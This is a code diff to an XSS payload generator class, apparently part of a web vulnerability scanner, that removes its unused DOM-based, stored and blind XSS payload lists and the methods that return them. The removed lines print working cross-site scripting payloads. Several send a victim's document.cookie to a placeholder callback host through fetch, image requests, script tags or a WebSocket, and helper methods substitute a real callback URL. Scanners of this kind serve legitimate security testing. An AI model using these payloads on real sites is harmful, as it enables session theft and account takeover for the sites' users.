@@ -63,56 +63,6 @@ class XSSPayloadGenerator:
             "<script>eval(atob('YWxlcnQoMSk='))</script>"
         ]
 
-        # DOM-based XSS payloads - Không sử dụng
-        self.dom_based_payloads = [
-            # Common DOM-based vectors
-            "<img src=x onerror=alert(document.cookie)>",
-            "<img src=x onerror=alert(document.domain)>",
-            "<svg onload=eval(location.hash.slice(1))>",
-            "'><img src=x onerror=alert(document.domain)>",
-            "javascript:alert(document.domain)",
-            "#<img src=/ onerror=alert(1)>",
-
-            # Hash injection
-            "#<script>alert(1)</script>",
-            "#javascript:alert(1)",
-
-            # DOM jQuery
-            "<div id=\"\"><img src=x onerror=alert(1)></div>",
-
-            # innerHTML triggers
-            "<img src=x onerror=alert(1)>",
-            "'><img src=x onerror=alert(document.cookie)><'"
-        ]
-
-        # Payloads for stored XSS testing - Không sử dụng
-        self.stored_payloads = [
-            # Long-term persistent payloads
-            "<script>fetch('https://CALLBACK-URL?cookie='+encodeURIComponent(document.cookie))</script>",
-            "<script>new Image().src='https://CALLBACK-URL?cookie='+encodeURIComponent(document.cookie)</script>",
-            "<img src=x onerror=\"fetch('https://CALLBACK-URL?cookie='+encodeURIComponent(document.cookie))\">",
-
-            # Stored payloads with console behavior
-            "<script>console.error('XSS')</script>",
-            "<script>console.log(document.cookie)</script>",
-
-            # Stored content manipulations
-            "<script>document.body.style.background='red'</script>",
-            "<style>body{background:black !important;color:red !important;}</style>"
-        ]
-
-        # Payloads for blind XSS testing - Không sử dụng
-        self.blind_payloads = [
-            # Callback URL based (replace CALLBACK-URL with your server)
-            "<script src='https://CALLBACK-URL/UNIQUE-ID'></script>",
-            "<img src=x onerror='fetch(\"https://CALLBACK-URL/UNIQUE-ID?cookie=\"+document.cookie)'>",
-            "<script>new Image().src='https://CALLBACK-URL/UNIQUE-ID?cookie='+document.cookie</script>",
-            "<script>fetch('https://CALLBACK-URL/UNIQUE-ID',{method:'POST',body:document.cookie})</script>",
-
-            # Websocket based
-            "<script>var ws=new WebSocket('wss://CALLBACK-URL');ws.onopen=function(){ws.send(document.cookie)}</script>"
-        ]
-
     def get_all_payloads(self):
         """
         Get all XSS payloads - Chỉ sử dụng reflected payloads
@@ -127,54 +77,6 @@ class XSSPayloadGenerator:
         """Get reflected XSS payloads - Phương thức được sử dụng"""
         return self.reflected_payloads
 
-    def get_dom_based_payloads(self):
-        """Get DOM-based XSS payloads - Phương thức không được sử dụng"""
-        return self.dom_based_payloads
-
-    def get_stored_payloads(self, callback_url=None):
-        """
-        Get stored XSS payloads - Phương thức không được sử dụng
-
-        Args:
-            callback_url (str): URL for exfiltration in stored payloads
-
-        Returns:
-            list: Stored XSS payloads
-        """
-        if not callback_url:
-            return self.stored_payloads
-
-        # Replace CALLBACK-URL with actual callback URL
-        customized_payloads = []
-        for payload in self.stored_payloads:
-            customized_payloads.append(
-                payload.replace('CALLBACK-URL', callback_url))
-
-        return customized_payloads
-
-    def get_blind_payloads(self, callback_url=None, unique_id=None):
-        """
-        Get blind XSS payloads - Phương thức không được sử dụng
-
-        Args:
-            callback_url (str): URL for exfiltration in blind payloads
-            unique_id (str): Unique identifier for tracking
-
-        Returns:
-            list: Blind XSS payloads
-        """
-        if not callback_url:
-            return self.blind_payloads
-
-        # Replace CALLBACK-URL with actual callback URL and unique ID
-        customized_payloads = []
-        for payload in self.blind_payloads:
-            modified = payload.replace('CALLBACK-URL', callback_url)
-            if unique_id:
-                modified = modified.replace('UNIQUE-ID', unique_id)
-            customized_payloads.append(modified)
-
-        return customized_payloads
 
     def generate_custom_payloads(self, template, values):
         """
